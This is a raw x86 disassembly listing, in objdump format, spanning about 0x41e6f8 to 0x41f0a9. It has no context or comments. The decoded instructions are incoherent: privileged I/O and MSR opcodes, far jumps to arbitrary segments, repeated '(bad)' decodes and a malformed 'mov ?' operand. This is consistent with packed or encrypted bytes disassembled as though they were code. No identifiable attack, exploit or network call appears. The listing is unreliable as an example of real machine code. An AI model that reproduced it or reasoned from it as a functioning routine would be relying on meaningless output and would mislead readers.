  41e6f8:	std    
  41e6f9:	jge    0x41e6f0
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    ebx,DWORD PTR [edi+0x17]
  41e702:	popa   
  41e703:	test   BYTE PTR [esp+eax*2],0x1
  41e707:	add    BYTE PTR ds:0x1000001,al
  41e70d:	pop    edi
  41e70e:	pop    ss
  41e70f:	neg    bh
  41e711:	ss push ss
  41e713:	rol    BYTE PTR [edx+0x6bd53532],cl
  41e719:	sub    DWORD PTR [ebx+0x5e],ebx
  41e71c:	inc    ecx
  41e71d:	xor    DWORD PTR [edi],0x9cc0d342
  41e723:	ret    
  41e724:	mov    bl,0xea
  41e726:	rdmsr  
  41e728:	out    dx,eax
  41e729:	div    BYTE PTR ds:0x484b813e
  41e72f:	sbb    ah,dh
  41e731:	lock pusha 
  41e733:	xor    eax,0xe44a96a2
  41e738:	stos   BYTE PTR es:[edi],al
  41e739:	adc    bl,BYTE PTR [ebx+esi*2-0x3583be2a]
  41e740:	mov    al,BYTE PTR [ecx]
  41e742:	stos   BYTE PTR es:[edi],al
  41e743:	mov    ds:0xf7b067cf,al
  41e748:	(bad)  
  41e74a:	pop    esi
  41e74b:	dec    edi
  41e74c:	test   eax,0x193fbe98
  41e751:	inc    ecx
  41e752:	jmp    0x32df785f
  41e757:	fcomp  st(7)
  41e759:	xor    edi,DWORD PTR [edx]
  41e75b:	xchg   esi,eax
  41e75c:	push   ds
  41e75d:	inc    ebp
  41e75e:	fwait
  41e75f:	mov    ebx,0xa8664f76
  41e764:	pop    ss
  41e765:	stc    
  41e766:	aaa    
  41e767:	jg     0x41e78f
  41e769:	and    eax,0xf3669172
  41e76e:	stos   BYTE PTR es:[edi],al
  41e76f:	addr16 mov bh,0x7a
  41e772:	cli    
  41e773:	and    ebx,DWORD PTR ds:0x6e5f67a
  41e779:	outs   dx,BYTE PTR ds:[esi]
  41e77a:	mov    eax,ds:0xdc1ead4a
  41e77f:	mov    al,0x34
  41e781:	ror    DWORD PTR [ecx+0x5a],0xb9
  41e785:	loope  0x41e796
  41e787:	and    BYTE PTR [edi-0x4f],0x52
  41e78b:	sub    ah,BYTE PTR [ecx+0x508bb298]
  41e791:	jns    0x41e806
  41e793:	sbb    al,0xbf
  41e795:	ret    
  41e796:	add    ecx,DWORD PTR [ebp-0x3]
  41e799:	mov    esi,0x38b5fa46
  41e79e:	jp     0x41e75f
  41e7a0:	aad    0x3f
  41e7a2:	dec    edx
  41e7a3:	xchg   esp,eax
  41e7a4:	sub    eax,0x3c66c5a6
  41e7a9:	xchg   ah,dh
  41e7ab:	xor    ebp,esi
  41e7ad:	ret    
  41e7ae:	mov    edx,0xa157414b
  41e7b3:	inc    DWORD PTR [ecx+0x37]
  41e7b6:	dec    ecx
  41e7b7:	pop    ebp
  41e7b8:	lds    ecx,FWORD PTR [eax]
  41e7ba:	cs dec edi
  41e7bc:	pop    ss
  41e7bd:	in     al,0xc6
  41e7bf:	xor    eax,0xc6bcfb3f
  41e7c4:	pushw  0xffa1
  41e7c7:	pop    es
  41e7c8:	out    0xc5,eax
  41e7ca:	mov    eax,0xcdc6f9f2
  41e7cf:	mov    dl,0xaa
  41e7d1:	push   ebx
  41e7d2:	sti    
  41e7d3:	or     dl,BYTE PTR ds:0x69b4366d
  41e7d9:	cld    
  41e7da:	(bad)  
  41e7db:	or     dl,dh
  41e7dd:	daa    
  41e7de:	into   
  41e7df:	mov    ch,0xe6
  41e7e1:	or     ebx,DWORD PTR [edi+0x66]
  41e7e4:	jmp    0xddf072a0
  41e7e9:	ins    DWORD PTR es:[edi],dx
  41e7ea:	and    eax,0x90ed0e06
  41e7ef:	ja     0x41e81d
  41e7f1:	sbb    eax,0x328433b1
  41e7f6:	jecxz  0x41e7a1
  41e7f8:	je     0x41e7d2
  41e7fa:	je     0x41e83e
  41e7fc:	scas   eax,DWORD PTR es:[edi]
  41e7fd:	push   0x905d5753
  41e802:	jmp    0x366522df
  41e807:	mov    al,ds:0xbdef3b17
  41e80c:	jae    0x41e7ca
  41e80e:	jb     0x41e7e6
  41e810:	test   BYTE PTR [eax],al
	...
  41e872:	add    BYTE PTR [eax],al
  41e874:	sub    eax,0x9e5c8a39
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e8b3
  41e881:	jecxz  0x41e858
  41e883:	cmp    eax,0x14511
  41e888:	add    eax,0xda000001
  41e88d:	xchg   DWORD PTR [ebp-0x12],edx
  41e890:	mov    edx,0xbb8a2188
  41e895:	jne    0x41e873
  41e897:	aam    0x33
  41e899:	ins    DWORD PTR es:[edi],dx
  41e89a:	fdiv   QWORD PTR [edx]
  41e89c:	inc    eax
  41e89d:	mov    cl,0xf1
  41e89f:	sbb    DWORD PTR [edi+ebx*4-0x66ae90f],edx
  41e8a6:	int    0xe0
  41e8a8:	pop    ecx
  41e8a9:	mov    bl,0x30
  41e8ab:	push   edx
  41e8ac:	ret    
  41e8ad:	pop    ds
  41e8ae:	add    BYTE PTR [eax],cl
  41e8b0:	mov    al,0xb
  41e8b2:	pop    eax
  41e8b3:	xor    DWORD PTR [ecx+0xc],0x51efec9a
  41e8ba:	je     0x41e8ec
  41e8bc:	fst    QWORD PTR [edi-0x114bacd4]
  41e8c2:	add    ch,BYTE PTR [eax]
  41e8c4:	adc    ebp,DWORD PTR [ebx+0x37]
  41e8c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8c8:	pushf  
  41e8c9:	sub    eax,0x8389063a
  41e8ce:	push   0x88caf24
  41e8d3:	mov    ebp,0xf3cce1fc
  41e8d8:	xchg   bl,ah
  41e8da:	std    
  41e8db:	push   esi
  41e8dc:	push   ss
  41e8dd:	icebp  
  41e8de:	dec    ebp
  41e8df:	push   edx
  41e8e0:	in     al,0xbd
  41e8e2:	sub    ecx,0xffffff9a
  41e8e5:	repz mov ecx,0x7d7d52b8
  41e8eb:	sbb    BYTE PTR [ebx+0x1d],dl
  41e8ee:	popf   
  41e8ef:	dec    edi
  41e8f0:	ret    
  41e8f1:	jmp    0xbf51894
  41e8f6:	add    dl,ah
  41e8f8:	add    DWORD PTR [esi-0x59],eax
  41e8fb:	ja     0x41e8d6
  41e8fd:	mov    dh,BYTE PTR [esi]
  41e8ff:	sub    eax,0x2b10cd28
  41e904:	pop    esp
  41e905:	aaa    
  41e906:	pop    es
  41e907:	lods   eax,DWORD PTR ds:[esi]
  41e908:	pop    esp
  41e909:	push   eax
  41e90a:	dec    ecx
  41e90b:	mov    ds:0xd7c25ada,eax
  41e910:	pop    esi
  41e911:	fmul   DWORD PTR [ebp-0x1]
  41e915:	mov    ah,0x1c
  41e917:	mov    esp,0xc55c4b01
  41e91c:	adc    eax,0xea3cf15c
  41e921:	cmp    al,0x71
  41e923:	push   ecx
  41e924:	push   esp
  41e925:	push   ds
  41e926:	loop   0x41e98c
  41e928:	push   0xa1190ed8
  41e92d:	fidivr DWORD PTR [eax-0x3a]
  41e930:	or     DWORD PTR [eax],edx
  41e932:	mov    ds:0x7e79a030,eax
  41e937:	sar    DWORD PTR [eax],1
  41e939:	lods   al,BYTE PTR ds:[esi]
  41e93a:	and    DWORD PTR [esi+edx*8],edx
  41e93d:	loop   0x41e8ea
  41e93f:	imul   edi,DWORD PTR [edx-0x17],0x31
  41e943:	nop
  41e944:	sar    BYTE PTR [ebx],cl
  41e946:	xor    ebx,0x910aa635
  41e94c:	adc    DWORD PTR [ebp*4-0x43428cfe],esi
  41e953:	stos   BYTE PTR es:[edi],al
  41e954:	xlat   BYTE PTR ds:[ebx]
  41e955:	jb     0x41e987
  41e957:	in     eax,dx
  41e958:	daa    
  41e959:	jp     0x41e902
  41e95b:	and    DWORD PTR [ebx],esi
  41e95d:	jecxz  0x41e96b
  41e95f:	in     al,dx
  41e960:	jmp    0x41e988
  41e962:	lea    ebx,[ebp-0x66a8930b]
  41e968:	icebp  
  41e969:	call   0x88be:0x76497fb8
  41e970:	sub    eax,0x43b5625b
  41e975:	ret    
  41e976:	dec    edx
  41e977:	inc    edi
  41e978:	or     edx,DWORD PTR [edi]
  41e97a:	xlat   BYTE PTR ds:[ebx]
  41e97b:	fcomi  st,st(4)
  41e97d:	push   ebp
  41e97e:	pop    esi
  41e97f:	jl     0x41e90c
  41e981:	aas    
  41e982:	rol    BYTE PTR [edx-0xd],1
  41e985:	mov    al,ds:0x9f2baf3f
  41e98a:	push   esp
  41e98b:	setnp  BYTE PTR [edx+0x3d]
  41e98f:	and    eax,0x3b
	...
  41e9f4:	js     0x41e9f3
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	push   cs
  41ea01:	pop    edx
  41ea02:	data16 sti 
  41ea04:	push   ss
  41ea05:	inc    esi
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    eax,0x50000001
  41ea0d:	mov    ebx,0xd4230fad
  41ea12:	into   
  41ea13:	xlat   BYTE PTR ds:[ebx]
  41ea14:	ins    BYTE PTR es:[edi],dx
  41ea15:	dec    edx
  41ea16:	inc    ebp
  41ea17:	fimul  DWORD PTR [ebx-0x352765c7]
  41ea1d:	and    BYTE PTR [edi],ch
  41ea1f:	sbb    al,0x18
  41ea21:	dec    esp
  41ea22:	mov    cl,ah
  41ea24:	cmp    ebp,esi
  41ea26:	push   esp
  41ea27:	in     eax,0x7c
  41ea29:	xchg   edx,eax
  41ea2a:	mov    ch,0xbc
  41ea2c:	sbb    eax,0xe3473e18
  41ea31:	in     al,0xa
  41ea33:	shl    BYTE PTR [edx+edi*8],cl
  41ea36:	nop    DWORD PTR [ecx]
  41ea39:	mov    WORD PTR [ebx-0x19],gs
  41ea3c:	pushf  
  41ea3d:	jle    0x41ea1d
  41ea3f:	leave  
  41ea40:	pop    esp
  41ea41:	cmp    al,0xcd
  41ea43:	adc    eax,0x56080524
  41ea48:	add    eax,0x18d76cb8
  41ea4d:	push   ecx
  41ea4e:	xchg   esp,eax
  41ea4f:	(bad)  
  41ea50:	fnstenv [ebx]
  41ea52:	or     cl,BYTE PTR [esi+edx*1-0x79]
  41ea56:	fmul   QWORD PTR [eax]
  41ea58:	xchg   ebx,eax
  41ea59:	dec    ebp
  41ea5a:	pop    ecx
  41ea5b:	or     DWORD PTR [ecx],ecx
  41ea5d:	mov    DWORD PTR [edi+0x72],0x7957b57c
  41ea64:	sub    BYTE PTR [ecx+ecx*2-0x48],al
  41ea68:	inc    esp
  41ea69:	shr    bl,1
  41ea6b:	sar    BYTE PTR [ecx-0x1d],cl
  41ea6e:	(bad)  
  41ea6f:	call   0x1cb11632
  41ea74:	mov    dh,0x94
  41ea76:	jnp    0x41ea99
  41ea78:	loopne 0x41ea79
  41ea7a:	test   al,0x3d
  41ea7c:	add    bh,BYTE PTR [esi+0xe1f22af]
  41ea82:	xchg   DWORD PTR [ecx],ebx
  41ea84:	cmp    DWORD PTR [eax+0x6891bf8c],edi
  41ea8a:	and    esi,DWORD PTR [eax+0x2c]
  41ea8d:	es jns 0x41ea7a
  41ea90:	dec    esp
  41ea91:	in     al,dx
  41ea92:	call   0x49a8c6ab
  41ea97:	out    dx,al
  41ea98:	sub    dl,BYTE PTR [ebx]
  41ea9a:	sahf   
  41ea9b:	test   al,0x30
  41ea9d:	sub    DWORD PTR [edi-0x4c],esi
  41eaa0:	add    BYTE PTR [edx-0x1edbef68],bl
  41eaa6:	and    DWORD PTR [ebp-0x6fe8e44c],ebx
  41eaac:	mov    cl,BYTE PTR [esi]
  41eaae:	or     esi,DWORD PTR [ebp-0x775258b4]
  41eab4:	repnz mov ds:0x8826cb1b,al
  41eaba:	ins    BYTE PTR es:[edi],dx
  41eabb:	rol    DWORD PTR [edx+0x35],1
  41eabe:	and    edi,ebx
  41eac0:	mov    BYTE PTR [bx+si-0x5f],ah
  41eac4:	sub    DWORD PTR [ecx-0x306e5911],0x29
  41eacb:	cmp    eax,0x19650e32
  41ead0:	push   cs
  41ead1:	mov    BYTE PTR [edi],ah
  41ead3:	es pop ecx
  41ead5:	rcl    DWORD PTR [edi-0x45],0x7f
  41ead9:	xchg   BYTE PTR [edi],ah
  41eadb:	out    dx,al
  41eadc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eadd:	add    BYTE PTR [ecx],dh
  41eadf:	fld    TBYTE PTR [ecx-0x3]
  41eae2:	push   cs
  41eae3:	stc    
  41eae4:	inc    edx
  41eae5:	pop    esi
  41eae6:	cmp    DWORD PTR [eax],ebx
  41eae8:	jecxz  0x41eaeb
  41eaea:	outs   dx,BYTE PTR ds:[esi]
  41eaeb:	xor    eax,0x10df4269
  41eaf0:	(bad)  
  41eaf1:	aad    0x2f
  41eaf3:	or     ebx,ebp
  41eaf5:	xor    al,0x98
  41eaf7:	mov    dl,0x2c
  41eaf9:	mov    bh,0x12
  41eafb:	inc    eax
  41eafc:	or     DWORD PTR [ecx+0xa],eax
  41eaff:	fwait
  41eb00:	pop    ss
  41eb01:	mov    BYTE PTR [ebp-0x53],bl
  41eb04:	mov    ebx,0x7a5336e9
  41eb09:	inc    BYTE PTR [esp+edx*8+0x1f]
  41eb0d:	loopne 0x41eb32
  41eb0f:	outs   dx,BYTE PTR ds:[esi]
  41eb10:	add    BYTE PTR fs:[eax],al
	...
  41eb73:	add    BYTE PTR [edx],dl
  41eb75:	das    
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0xf3
  41eb81:	or     bh,dl
  41eb83:	retf   0x471b
  41eb86:	add    DWORD PTR [eax],eax
  41eb88:	add    eax,0xc7000001
  41eb8d:	mov    DWORD PTR [edx],esi
  41eb8f:	lock ds inc ebp
  41eb92:	xor    dl,bh
  41eb94:	out    dx,al
  41eb95:	ss popa 
  41eb97:	clc    
  41eb98:	add    DWORD PTR [ecx+edx*2-0x76],0xf
  41eb9d:	and    dh,BYTE PTR [ecx+edx*8]
  41eba0:	int3   
  41eba1:	jmp    0xd42e3cc5
  41eba6:	pop    DWORD PTR [esi-0x18]
  41eba9:	into   
  41ebaa:	jb     0x41ebd2
  41ebac:	jg     0x41ec14
  41ebae:	xchg   ebx,eax
  41ebaf:	aaa    
  41ebb0:	push   0x40
  41ebb2:	js     0x41eb45
  41ebb4:	out    dx,eax
  41ebb5:	or     BYTE PTR [esi+0x78ea4f63],cl
  41ebbb:	mov    al,ds:0x671bb86a
  41ebc0:	and    eax,0x7bd2e865
  41ebc5:	sub    eax,0xa64c416d
  41ebca:	adc    eax,0x315c2dac
  41ebcf:	mov    dh,0x2a
  41ebd1:	nop
  41ebd2:	sub    al,0xa4
  41ebd4:	jae    0x41ec44
  41ebd6:	jmp    0x492953ab
  41ebdb:	cmp    al,0x56
  41ebdd:	repz clc 
  41ebdf:	add    eax,0x4aec6353
  41ebe4:	sbb    DWORD PTR [edi-0x7450499a],0xffffffa5
  41ebeb:	and    bl,BYTE PTR [ebp-0x62]
  41ebee:	sbb    BYTE PTR [ebp+esi*2-0x3684528b],0x19
  41ebf6:	cmc    
  41ebf7:	and    bl,BYTE PTR [edx+0x47]
  41ebfa:	sub    cl,0xa
  41ebfd:	(bad)  
  41ebff:	cmp    eax,0x83da6e99
  41ec04:	add    DWORD PTR [edx],esi
  41ec06:	cmp    al,0x91
  41ec08:	or     esi,DWORD PTR [esi-0x748beec]
  41ec0e:	rcr    BYTE PTR [esi+0x0],0x5
  41ec12:	clc    
  41ec13:	push   eax
  41ec14:	lods   eax,DWORD PTR ds:[esi]
  41ec15:	mov    bl,0x97
  41ec17:	jno    0x41eba9
  41ec19:	or     ecx,0x71
  41ec1c:	sub    BYTE PTR [eax-0x395bc769],bh
  41ec22:	ds je  0x41ebb6
  41ec25:	xor    ecx,esi
  41ec27:	xchg   ebx,eax
  41ec28:	jmp    0x41ebe7
  41ec2a:	dec    eax
  41ec2b:	stc    
  41ec2c:	dec    esp
  41ec2d:	mov    eax,ds:0x4c99415c
  41ec32:	(bad)  
  41ec33:	pop    esi
  41ec34:	lds    eax,FWORD PTR [edx-0x1c9a8d4f]
  41ec3a:	mov    bl,0xd
  41ec3c:	ja     0x41ec68
  41ec3e:	into   
  41ec3f:	stos   DWORD PTR es:[edi],eax
  41ec40:	in     al,0x41
  41ec42:	mov    dh,0xf7
  41ec44:	push   ebp
  41ec45:	xchg   DWORD PTR [edi+ecx*4+0x17ebb2c0],ecx
  41ec4c:	or     esp,DWORD PTR [ebx]
  41ec4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec4f:	sbb    ah,BYTE PTR [ebx]
  41ec51:	cmp    eax,0x1495e79f
  41ec56:	aaa    
  41ec57:	cmp    DWORD PTR [ecx-0x4569997d],esi
  41ec5d:	sbb    BYTE PTR [edx+0x610bee73],bl
  41ec63:	(bad)  
  41ec64:	scas   eax,DWORD PTR es:[edi]
  41ec65:	lock lds ecx,FWORD PTR [ebp+0x1596c304]
  41ec6c:	mov    cs,WORD PTR [esi+0x520e0bbe]
  41ec72:	int3   
  41ec73:	lock cwde 
  41ec75:	push   ecx
  41ec76:	cmp    dl,BYTE PTR [edx-0x73]
  41ec79:	scas   eax,DWORD PTR es:[edi]
  41ec7a:	xchg   BYTE PTR [ecx],bl
  41ec7c:	mov    edi,0xc78fbe6b
  41ec81:	dec    esi
  41ec82:	dec    esp
  41ec83:	popa   
  41ec84:	dec    sp
  41ec86:	xchg   edx,eax
  41ec87:	pop    edx
  41ec88:	mov    ebx,DWORD PTR [esp+edi*1-0x1a]
  41ec8c:	cmp    eax,ebx
  41ec8e:	je     0x41ecda
  41ec90:	pop    esp
	...
  41ecf1:	add    BYTE PTR [eax],al
  41ecf3:	add    BYTE PTR [ecx-0xf],al
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0xbbde5fd0
  41ed02:	push   eax
  41ed03:	mov    cl,0x20
  41ed05:	dec    eax
  41ed06:	add    DWORD PTR [eax],eax
  41ed08:	add    eax,0xf9000001
  41ed0d:	push   0x3fc9fc1f
  41ed12:	test   BYTE PTR [esi+0x42],ah
  41ed15:	rep stos BYTE PTR es:[edi],al
  41ed17:	ret    0xadc
  41ed1a:	jb     0x41ed36
  41ed1c:	test   eax,0x6bb3c1e5
  41ed21:	data16 sbb BYTE PTR [eax+0x256e6011],bl
  41ed28:	sbb    eax,0x5531570e
  41ed2d:	xlat   BYTE PTR ds:[ebx]
  41ed2e:	or     eax,0x8dbbf37a
  41ed33:	dec    ecx
  41ed34:	xor    cl,BYTE PTR [esp+eax*8]
  41ed37:	xor    dh,BYTE PTR [eax-0x3c618948]
  41ed3d:	retf   0xa12b
  41ed40:	push   edi
  41ed41:	dec    esi
  41ed42:	pusha  
  41ed43:	cwde   
  41ed44:	shl    BYTE PTR [ebx+0x1a49df99],cl
  41ed4a:	dec    edi
  41ed4b:	dec    ah
  41ed4d:	pop    ss
  41ed4e:	xchg   ebp,eax
  41ed4f:	adc    eax,0x5b89e8d
  41ed54:	nop
  41ed55:	or     edi,edi
  41ed57:	les    edi,FWORD PTR ds:0xdef2705b
  41ed5d:	sub    eax,0x7e0c6abc
  41ed62:	dec    esp
  41ed63:	mov    gs,WORD PTR [ecx]
  41ed65:	and    DWORD PTR [eax-0x3baec3d8],ebp
  41ed6b:	js     0x41edd0
  41ed6d:	(bad)  
  41ed6e:	repz inc esp
  41ed70:	jns    0x41edaa
  41ed72:	push   ss
  41ed73:	stos   BYTE PTR es:[edi],al
  41ed74:	jbe    0x41ed3b
  41ed76:	data16 outs dx,BYTE PTR ds:[esi]
  41ed78:	cmp    DWORD PTR [edx-0x33],eax
  41ed7b:	sbb    ch,dh
  41ed7d:	popf   
  41ed7e:	jge    0x41ed01
  41ed80:	sbb    al,0x47
  41ed82:	cmp    bh,BYTE PTR [edi+0x27]
  41ed85:	sub    bh,BYTE PTR [esi]
  41ed87:	(bad)  
  41ed89:	mov    dh,0xb
  41ed8b:	outs   dx,BYTE PTR ds:[esi]
  41ed8c:	sbb    DWORD PTR [edx-0x1f],ebx
  41ed8f:	lock fnstsw WORD PTR [esi-0x20fe208b]
  41ed96:	test   al,0x53
  41ed98:	push   eax
  41ed99:	jecxz  0x41ee0b
  41ed9b:	inc    ebx
  41ed9c:	rcl    dl,cl
  41ed9e:	aas    
  41ed9f:	pop    edi
  41eda0:	mov    dl,0x2
  41eda2:	pop    ebp
  41eda3:	pop    ds
  41eda4:	ror    BYTE PTR [esi+0x3a],0xd
  41eda8:	sub    ebx,DWORD PTR [ecx-0x4e]
  41edab:	xchg   ebx,eax
  41edac:	mov    edi,0xa0e4f869
  41edb1:	mov    esi,0x69fba10d
  41edb6:	sbb    eax,0x6710597d
  41edbb:	lock mov dl,0xd7
  41edbe:	cmc    
  41edbf:	pop    ebp
  41edc0:	fisubr WORD PTR [edi]
  41edc2:	jmp    0x41ed8e
  41edc4:	in     eax,dx
  41edc5:	ins    DWORD PTR es:[edi],dx
  41edc6:	rcl    BYTE PTR [ebx],0xd2
  41edc9:	inc    esp
  41edca:	out    dx,al
  41edcb:	push   esp
  41edcc:	idiv   DWORD PTR ds:0xd35c
  41edd1:	nop
  41edd2:	retf   0x6afd
  41edd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edd6:	add    BYTE PTR [edx-0x1d],dh
  41edd9:	neg    DWORD PTR ds:0x5da14efd
  41eddf:	sti    
  41ede0:	jmp    0x41edae
  41ede2:	sub    DWORD PTR [edx-0x12e1844b],ebp
  41ede8:	loopne 0x41edab
  41edea:	adc    edx,edx
  41edec:	lahf   
  41eded:	stc    
  41edee:	dec    edi
  41edef:	jmp    0x697:0x5327f2a
  41edf6:	cmp    edi,esp
  41edf8:	and    eax,0x6620caf7
  41edfd:	loop   0x41ee29
  41edff:	cmc    
  41ee00:	es adc ebx,ebx
  41ee03:	fs mov ebx,0x64a0d69
  41ee09:	lahf   
  41ee0a:	and    eax,0x6befe906
  41ee0f:	inc    esi
  41ee10:	ret    
	...
  41ee71:	add    BYTE PTR [eax],al
  41ee73:	add    BYTE PTR ds:0x7b197956,al
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0x2560:0x4b85c0e7
  41ee85:	dec    ecx
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    eax,0x7e000001
  41ee8d:	mov    esi,0xe32429a0
  41ee92:	xor    DWORD PTR [edx+0x1d],ecx
  41ee95:	sbb    eax,0x6ebeaf4e
  41ee9a:	cs mov edi,0x9eef62da
  41eea0:	mov    bl,0xde
  41eea2:	ins    BYTE PTR es:[edi],dx
  41eea3:	mov    eax,DWORD PTR [ecx-0x35cc47aa]
  41eea9:	in     eax,0xd2
  41eeab:	xor    al,0x8
  41eead:	xor    eax,DWORD PTR [edi+eax*8-0x127e9e9b]
  41eeb4:	inc    eax
  41eeb5:	je     0x41ee72
  41eeb7:	cmp    bl,BYTE PTR [ebp+0x50]
  41eeba:	inc    edi
  41eebb:	aam    0x5d
  41eebd:	loop   0x41ef28
  41eebf:	jb     0x41ef03
  41eec1:	add    dh,BYTE PTR [eax]
  41eec3:	pop    ebp
  41eec4:	xor    DWORD PTR [ecx],0x7c
  41eec7:	daa    
  41eec8:	sti    
  41eec9:	stos   BYTE PTR es:[edi],al
  41eeca:	arpl   WORD PTR [edx+0xe191061],bx
  41eed0:	mov    al,0x56
  41eed2:	or     al,0x49
  41eed4:	sbb    ecx,0x94e8e6c9
  41eeda:	mov    ebp,0xe051188d
  41eedf:	sub    DWORD PTR [edx+0x75937329],0x13
  41eee6:	sub    ah,ch
  41eee8:	mov    WORD PTR [esi],gs
  41eeea:	sbb    esi,DWORD PTR [eax-0x3f]
  41eeed:	or     al,0x2b
  41eeef:	imul   eax,DWORD PTR [edi],0x22ef153b
  41eef5:	mov    esi,0x9a529345
  41eefa:	rol    DWORD PTR ds:0x4b3689d8,cl
  41ef00:	pop    edi
  41ef01:	lock xchg esi,eax
  41ef03:	adc    BYTE PTR ds:0x9c6a3683,cl
  41ef09:	retf   0x4f16
  41ef0c:	pop    ebp
  41ef0d:	pop    ds
  41ef0e:	xor    ebx,DWORD PTR [edx-0x11]
  41ef11:	adc    cl,BYTE PTR [ebp+0x67]
  41ef14:	xor    DWORD PTR [ecx],0x5
  41ef17:	mov    edx,0xd526732d
  41ef1c:	cmp    ah,BYTE PTR [ecx]
  41ef1e:	test   eax,0xc2aa754b
  41ef23:	pop    edi
  41ef24:	xchg   ebx,eax
  41ef25:	adc    eax,0x5aca79d3
  41ef2a:	bound  ecx,QWORD PTR [edi]
  41ef2c:	jb     0x41ef1d
  41ef2e:	push   ds
  41ef2f:	rol    ch,1
  41ef31:	imul   edi,DWORD PTR [ebx],0x77
  41ef34:	(bad)  
  41ef35:	push   esi
  41ef36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef37:	jp     0x41eecd
  41ef39:	sub    al,0xec
  41ef3b:	add    DWORD PTR [ebp+edi*8-0x44],esi
  41ef3f:	mov    es,ecx
  41ef41:	test   eax,0x50ebf74e
  41ef46:	retf   
  41ef47:	cwde   
  41ef48:	jle    0x41ef31
  41ef4a:	inc    ebx
  41ef4b:	imul   ebx,eax,0x8b2ad7d
  41ef51:	inc    ebp
  41ef52:	adc    BYTE PTR [bx+di-0x4d],ch
  41ef56:	inc    edx
  41ef57:	xchg   ebx,eax
  41ef58:	sti    
  41ef59:	and    DWORD PTR [eax+0x27],esi
  41ef5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef5d:	mov    edx,eax
  41ef5f:	and    eax,0x4c59dc0a
  41ef64:	dec    ebp
  41ef65:	loopne 0x41ef49
  41ef67:	cwde   
  41ef68:	cmc    
  41ef69:	out    dx,al
  41ef6a:	mov    bl,0x9b
  41ef6c:	test   al,0xb9
  41ef6e:	jl     0x41efcf
  41ef70:	inc    esi
  41ef71:	add    cl,BYTE PTR [ecx]
  41ef73:	aam    0xc3
  41ef75:	out    dx,al
  41ef76:	inc    ebx
  41ef77:	pop    ds
  41ef78:	jns    0x41eefe
  41ef7a:	or     eax,0x4872d141
  41ef7f:	test   BYTE PTR [ecx-0x6454e430],dh
  41ef85:	ss xchg ebp,eax
  41ef87:	(bad)  
  41ef88:	xchg   esi,eax
  41ef89:	xor    eax,0x656fb0c0
  41ef8e:	inc    edi
  41ef8f:	adc    ebp,DWORD PTR [ebp+0x0]
	...
  41eff1:	add    BYTE PTR [eax],al
  41eff3:	add    BYTE PTR [ecx-0xda40a3],bh
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul ecx,DWORD PTR [edi],0xffffffb3
  41f002:	lods   al,BYTE PTR ds:[esi]
  41f003:	out    dx,eax
  41f004:	sub    cl,BYTE PTR [edx+0x1]
  41f007:	add    BYTE PTR ds:0xa4000001,al
  41f00d:	jae    0x41f06d
  41f00f:	test   al,0x20
  41f011:	adc    al,0x97
  41f013:	mov    al,0x3f
  41f015:	jmp    0x5c67:0x6597f0ac
  41f01c:	pop    ecx
  41f01d:	and    al,0x88
  41f01f:	sub    BYTE PTR [ebp-0x649162dd],ch
  41f025:	jno    0x41f00c
  41f027:	sbb    DWORD PTR [eax+0x15],ecx
  41f02a:	out    0xbe,eax
  41f02c:	stos   BYTE PTR es:[edi],al
  41f02d:	je     0x41efe6
  41f02f:	jo     0x41f01d
  41f031:	jns    0x41efe0
  41f033:	mov    ecx,DWORD PTR [edi]
  41f035:	cwde   
  41f036:	mov    dl,0xef
  41f038:	mov    eax,0xe59a63c3
  41f03d:	cmp    bh,BYTE PTR [edi-0x22ab7ab1]
  41f043:	inc    esi
  41f044:	arpl   WORD PTR [eax-0x2d],dx
  41f047:	lds    ebx,FWORD PTR [edi-0x58ce7a2f]
  41f04d:	xchg   ebx,eax
  41f04e:	adc    DWORD PTR [ecx+0x3425d34],esi
  41f054:	mov    eax,ds:0x776d1edd
  41f059:	inc    ebp
  41f05a:	sbb    esp,DWORD PTR [edx+0x7a]
  41f05d:	daa    
  41f05e:	xchg   edx,eax
  41f05f:	xchg   esi,eax
  41f060:	push   ebp
  41f061:	in     eax,dx
  41f062:	add    ch,BYTE PTR [ecx-0x29]
  41f065:	mov    al,BYTE PTR [eax-0x466b9304]
  41f06b:	aam    0xa2
  41f06d:	and    al,0x6d
  41f06f:	inc    eax
  41f070:	mov    dl,0xb4
  41f072:	mov    dh,0xe0
  41f074:	(bad)  
  41f075:	icebp  
  41f076:	mov    ?,WORD PTR [edi+0x50]
  41f079:	pushf  
  41f07a:	rcl    DWORD PTR [edx+0x42],cl
  41f07d:	mov    ebx,DWORD PTR [ecx]
  41f07f:	mov    esp,0xc5964110
  41f084:	add    ch,cl
  41f086:	mov    ds:0x2ee1efa6,al
  41f08b:	daa    
  41f08c:	lahf   
  41f08d:	fdiv   DWORD PTR [ecx-0xe]
  41f090:	mov    al,BYTE PTR [ebx-0x40f291cb]
  41f096:	outs   dx,DWORD PTR ds:[esi]
  41f097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f098:	jne    0x41f037
  41f09a:	lods   al,BYTE PTR ds:[esi]
  41f09b:	jl     0x41f06d
  41f09d:	loope  0x41f0d3
  41f09f:	enter  0x5965,0x4e
  41f0a3:	aaa    
  41f0a4:	xchg   ecx,eax
  41f0a5:	hlt    
  41f0a6:	push   ds
  41f0a7:	xchg   edi,eax
  41f0a8:	dec    ebp
  41f0a9:	push   cs
